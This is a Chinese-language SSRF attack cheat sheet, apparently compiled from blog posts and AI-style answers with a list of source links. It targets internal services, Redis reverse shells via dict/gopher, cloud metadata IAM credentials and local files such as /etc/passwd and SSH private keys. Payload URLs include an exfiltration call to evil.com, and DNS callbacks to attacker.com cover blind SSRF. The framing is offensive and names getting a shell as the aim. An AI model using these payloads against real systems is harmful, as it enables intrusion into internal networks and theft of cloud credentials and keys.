# 协议与利用

- dict （操作Redis）
- file （任意文件读取）
- ftp、ftps （FTP爆破）
- tftp（UDP协议扩展）
- gopher （操作Redis、Memcached）
- imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
- rtsp
- smb/smbs （连接SMB）
- telnet - 连接SSH/Telnet
- http、https - 内网服务探测
    - 网络服务探测
    - ShellShock命令执行
    - JBOSS远程Invoker war命令执行
    - Java调试接口命令执行
    - axis2-admin部署Server命令执行
    - Jenkins Scripts接口命令执行
    - Confluence SSRF
    - Struts2一堆命令执行
    - counchdb WEB API远程命令执行
    - mongodb SSRF
    - docker API远程命令执行
    - php_fpm/fastcgi 命令执行
    - tomcat命令执行
    - Elasticsearch引擎Groovy脚本命令执行
    - WebDav PUT上传任意文件
    - WebSphere Admin可部署war间接命令执行
    - Apache Hadoop远程命令执行
    - zentoPMS远程命令执行
    - HFS远程命令执行
    - glassfish任意文件读取和war文件部署间接命令执行

攻击影响获得最大化必须得GET SHELL，通过dict/gopher协议来操作Redis写反弹SHELL是目前最方便的姿势。


**Server-Side Request Forgery (SSRF)**漏洞允许攻击者让服务器发起请求，而通常攻击者无法直接访问这些资源。如果SSRF漏洞只能在HTTP协议下利用，我们可以利用服务器的网络权限，来间接访问和获取内部信息或资源。下面是几种具体的利用方案：

### 1. **内部服务探测与信息泄露**

即使限制在HTTP协议范围，许多服务器在内网中会运行HTTP服务，比如面向开发人员的管理面板、API服务、监控工具等。通过SSRF，攻击者可以对内部网络进行扫描和信息探测。

**利用步骤：**

- 通过SSRF请求服务器内部地址，探测是否存在服务，例如：
    
    bash
    
    复制代码
    
    `http://127.0.0.1:8080 http://10.0.0.1:80 http://172.16.0.1:8000`
    
- 利用端口扫描，通过不同的端口组合进行尝试，找出服务运行的具体端口。
- 一旦找到内部服务，通过进一步的SSRF请求来收集这些服务的响应头、页面内容、API返回结果等，可能会泄露敏感信息，例如开发者信息、版本号、配置文件等。

**常见目标：**

- **内部API服务**：一些API可能没有严格的权限控制，可以通过SSRF直接访问。
- **Kubernetes API**：如果应用托管在Kubernetes上，内部的Kubernetes API常使用HTTP协议，攻击者可尝试请求例如`http://localhost:8001/api/v1/nodes`。
- **Redis管理面板、Jenkins等**：这些面板通常不会暴露在公网，但可能对内网开放。

### 2. **端口扫描与服务枚举**

通过SSRF可用于扫描服务器内外部的端口和服务，即使被限制为HTTP协议，仍可利用服务器发出的HTTP请求来验证某些端口是否打开。

**利用步骤：**

- 发起SSRF请求不同的IP地址和端口组合，观察响应时间和返回的状态码。例如：
    
    bash
    
    复制代码
    
    `http://127.0.0.1:22 http://10.0.0.1:3306 http://172.16.0.1:5000`
    
    - 如果返回特定的状态码如200，说明该端口运行了HTTP服务。
    - 若响应时间过长或返回连接超时，则说明端口关闭或无响应。

**高级技巧：**

- 通过观察HTTP响应状态码（如200、301、403等）或通过判断响应时间长短，推测内部服务的类型和运行情况。

### 3. **绕过Web应用防火墙（WAF）**

某些Web应用防火墙（WAF）会限制对外发出的请求，但可能没有充分过滤SSRF请求。通过SSRF可以利用内部的网络权限，进行内部跳板攻击。

**利用步骤：**

- 如果服务器能发出HTTP请求，利用SSRF将流量通过内网或代理（如防火墙后面的服务器），然后进行更大范围的攻击，例如向外部恶意服务器发送数据包。
- 通过请求外部恶意的URL，获取特定内部信息：
    
    bash
    
    复制代码
    
    `http://evil.com/capture?data=internal`
    
    如果服务器能够直接访问外部网络，这样的请求可以在攻击者控制的服务器上获取内部数据。

### 4. **获取云服务的元数据**

在云平台上（如AWS、Google Cloud、Azure），云实例的元数据通常通过HTTP服务访问。通过SSRF，可以尝试访问这些元数据API，进而获取敏感信息如IAM凭据、API密钥等。

**利用步骤：**

- 通过SSRF请求云实例的元数据地址。例如：
    
    bash
    
    复制代码
    
    `http://169.254.169.254/latest/meta-data/  # AWS EC2 http://metadata.google.internal/computeMetadata/v1/  # Google Cloud`
    
- 访问特定路径，获取实例的详细信息，如：
    
    bash
    
    复制代码
    
    `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
    

**常见目标：**

- **AWS**：获取EC2实例的临时凭据，访问S3存储桶或其他服务。
- **Google Cloud**：获取OAuth 2.0凭据，访问Google Cloud资源。

### 5. **利用DNS Rebinding绕过协议限制**

通过某些特殊手段，攻击者可以将HTTP协议的请求引向非HTTP协议的服务，从而绕过协议限制。例如，利用DNS Rebinding，将内部的DNS解析到攻击者控制的服务器，进而发起对内部非HTTP协议服务（如Redis、MySQL）的攻击。

**利用步骤：**

- 配置一个恶意域名，能够将域名在不同时间或针对不同请求解析为不同的IP地址（即DNS Rebinding技术）。
- 通过SSRF发送HTTP请求至恶意域名，并在服务器端解析为非HTTP协议的目标服务，如：
    
    bash
    
    复制代码
    
    `http://evil.com  -> 实际解析为 127.0.0.1:6379 (Redis服务)`
    
    通过这种方式，即使限制为HTTP协议，也能尝试对内部服务进行攻击。

### 6. **SSRF + 任意文件读取**

如果SSRF可以用来请求本地文件服务（例如，通过file协议），则攻击者可以尝试读取本地文件的内容，例如配置文件、密钥等。

**利用步骤：**

- 尝试通过HTTP协议来访问内部资源的文件路径，测试是否可以直接读取本地文件。例如：
    
    bash
    
    复制代码
    
    `http://127.0.0.1/file:///etc/passwd http://localhost/file:///root/.ssh/id_rsa`
    

**常见目标：**

- **配置文件**：如数据库配置文件、Web应用配置文件，可能泄露敏感信息。
- **SSH密钥**：如用户的SSH私钥文件等。

---

通过这些方法，即使SSRF漏洞只能使用HTTP协议，攻击者依然可以通过巧妙的手段获取敏感信息或执行内部攻击，特别是针对内部的HTTP服务或利用云平台的元数据API。

[SSRF安全指北 - 博客 - 腾讯安全应急响应中心](https://security.tencent.com/index.php/blog/msg/179)

[Java 代码审计-SSRF](https://xz.aliyun.com/t/7186?u_atoken=0232dbc92804d7659b3022e8bbf0fe25&u_asig=ac11000117288405807373582e0133)

来源

1. [实战篇丨聊一聊SSRF漏洞的挖掘思路与技巧](https://www.cnblogs.com/ichunqiu/p/10916817.html) [2019-05-24]

2. [SSRF漏洞（原理、漏洞利用、修复建议） - coderge](https://www.cnblogs.com/coderge/articles/13703065.html) [2020-09-20]

3. [Ssrf漏洞原理攻击与防御(超详细总结) - Csdn博客](https://blog.csdn.net/qq_43378996/article/details/124050308)

4. [Ssrf漏洞深入利用与防御方案绕过技巧 - 阿里云开发者 ...](https://developer.aliyun.com/article/1617756) [2024-10-09]

5. [SSRF漏洞的利用与攻击内网应用实战 - 先知社区](https://xz.aliyun.com/t/7405) [2020-03-24]

6. [SSRF攻击实例解析](https://www.cnblogs.com/cyjaysun/p/4378504.html) [2015-03-30]

7. [【04】SSRF 漏洞原理与实际案例介绍.md - GitHub](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9004%E3%80%91SSRF+%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/%E3%80%9004%E3%80%91SSRF+%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D.md)

8. [Ssrf漏洞原理、挖掘技巧及实战案例全汇总 - 腾讯云](https://cloud.tencent.com/developer/article/1516352)

9. [SSRF漏洞利用与getshell实战（精选） - 腾讯云](https://cloud.tencent.com/developer/article/1511949)

10. [SSRF漏洞（原理、挖掘点、漏洞利用、修复建议） - Saint_Michael - 博客园](https://www.cnblogs.com/miruier/p/13907150.html)

11. [ssrf挖掘思路及案例讲解原创](https://blog.csdn.net/2301_81533492/article/details/134977848) [2023-12-13]

12. [【THM】Intro to SSRF(服务器端请求伪造漏洞简介)-学习 - Hekeatsll - 博客园](https://www.cnblogs.com/Hekeats-L/p/16919147.html) [2022-11-23]

13. [SSRF漏洞详解与利用原创](https://blog.csdn.net/weixin_40228200/article/details/128265826) [2022-12-10]

14. [Ssrf最全总结(协议,绕过) - Csdn博客](https://blog.csdn.net/weixin_50464560/article/details/122473887)

15. [ASTTeam/SSRF: 《深入理解WEB漏洞之SSRF漏洞》Server ... - GitHub](https://github.com/ASTTeam/SSRF)

16. [4.4. SSRF — Web安全学习笔记 1.0 文档 - Read the Docs](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)

17. [SSRF安全指北- 博客](https://security.tencent.com/index.php/blog/msg/179) [2021-01-26]

18. [SSRF服务器请求伪造原理和攻击方法- Zeker62](https://www.cnblogs.com/Zeker62/p/15167763.html) [2021-08-14]

19. [SSRF漏洞入门](https://tr0jan.top/archives/72/)

20. [从一文中了解ssrf的各种绕过姿势及攻击思路 - 腾讯云](https://cloud.tencent.com/developer/article/2288231)

21. [【SSRF漏洞】——http协议常见绕过原创](https://blog.csdn.net/qq_74350234/article/details/142177377) [2024-09-13]

Java 无回显的 SSRF（Server-Side Request Forgery）漏洞利用相对复杂，因为在没有直接回显的情况下，攻击者无法从服务器的响应中直接获取信息。无回显 SSRF 的利用方式通常依赖于间接的反馈机制，例如侧信道（side channel）或者通过外部观察到的行为变化。以下是常见的无回显 SSRF 利用方法：

### 1. **利用外部服务的反馈**

通过构造 SSRF 请求访问攻击者控制的外部服务器，比如 DNS 服务器、HTTP 服务器，来检测是否成功发送了请求。例如：

- **DNS 外带**：构造请求访问类似 `http://attacker.com`，通过 DNS 解析记录来判断服务器是否发送了请求。
- **HTTP 日志**：攻击者可以通过在自己的 HTTP 服务器上观察是否收到了服务器发出的 HTTP 请求。

这种方式常用于检测服务器是否可以访问内网资源或外部服务器。

### 2. **时间盲注（Time-Based Blind SSRF）**

攻击者通过引入网络延迟或者其他可控制的副作用，观察服务器响应的时间长短来推测是否成功发起了 SSRF 请求。例如：

- 如果请求的目标地址需要很长时间才能响应，服务器处理该请求的时间也会相应延长。这可以通过访问一个不存在的 IP 地址或耗时较长的服务来实现。
- 例如，尝试 SSRF 请求去访问一个超时较长的服务（比如 `http://10.0.0.1:8080`），通过观察服务器的响应时间推测是否请求成功。

### 3. **端口扫描**

SSRF 可以用于内部端口扫描。例如，构造 SSRF 请求去访问内网中的不同端口，然后通过响应的时间或外部反馈判断某个端口是否开放。例如：

- 尝试访问 `http://internal-ip:22`， `http://internal-ip:80` 等常见端口，通过不同的响应时间推测端口状态。
- 若服务器处理不同端口的时间差异明显，可以推测某些端口是否开放。

### 4. **与其他漏洞结合利用**

SSRF 漏洞如果与其他漏洞结合起来，可能会产生更大的影响。例如：

- 与文件读取漏洞结合：如果目标应用允许 SSRF 请求读取本地文件（例如通过 `file://` 协议），攻击者可以通过 SSRF 请求获取敏感文件。
- 与命令执行漏洞结合：如果 SSRF 请求可以触发服务端执行特定命令，攻击者可以利用 SSRF 远程执行命令。

### 5. **请求第三方开放的 API**

在某些情况下，攻击者可以利用 SSRF 向外部第三方 API 发起请求，而该 API 会返回一些对攻击者有用的信息。例如：

- 请求类似 AWS Metadata API (`http://169.254.169.254/latest/meta-data/`) 来获取云服务器的实例元数据。
- 如果可以访问敏感的内部服务（如 Redis、Jenkins 等），可能导致权限提升等进一步攻击。

### 6. **数据外泄**

攻击者可以利用 SSRF 将敏感数据通过 HTTP 请求发送到外部服务器。例如，攻击者可以利用 SSRF 漏洞请求访问内部存储敏感数据的资源（如数据库 API、云服务等），并将数据发送到外部攻击者的服务器。

---

**总结：** 无回显 SSRF 攻击通常通过外部反馈机制、时间盲注、端口扫描等方式来实现利用。在实际利用过程中，攻击者往往会结合其他漏洞（如文件读取、命令执行）进一步扩大攻击效果。